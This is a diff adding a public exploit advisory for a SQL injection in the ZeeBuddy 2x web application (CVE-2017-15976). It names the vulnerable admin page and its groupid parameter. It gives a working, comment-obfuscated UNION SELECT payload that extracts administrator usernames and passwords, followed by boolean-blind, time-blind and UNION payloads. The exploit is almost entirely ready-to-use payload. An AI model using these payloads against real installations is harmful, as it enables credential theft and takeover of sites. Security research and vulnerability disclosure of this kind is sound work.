@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: ZeeBuddy 2x - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.zeescripts.com/
+# Software Link: http://www.zeebuddy.com/
+# Demo: http://www.zeebuddy.com/demo/
+# Version: 2x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15976
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/admin/editadgroup.php?groupid=[SQL]
+# 
+# -1++/*!00009UNION*/+/*!00009SELECT*/+0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,(SELECT+GROUP_CONCAT(0x557365726e616d653a,name,0x3c62723e,0x50617373776f72643a,pwd+SEPARATOR+0x3c62723e)+FROM+admin)--+-
+# 
+# Parameter: groupid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: groupid=1 AND 3188=3188
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: groupid=1 AND SLEEP(5)
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 9 columns
+#     Payload: groupid=1 UNION ALL SELECT CONCAT(0x71707a7071,0x754642515970647855775a494a486368477a6e45755355495050634270466969495966676b78536c,0x7162767071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oMUM
+# 	
+# Etc..
+# # # # #
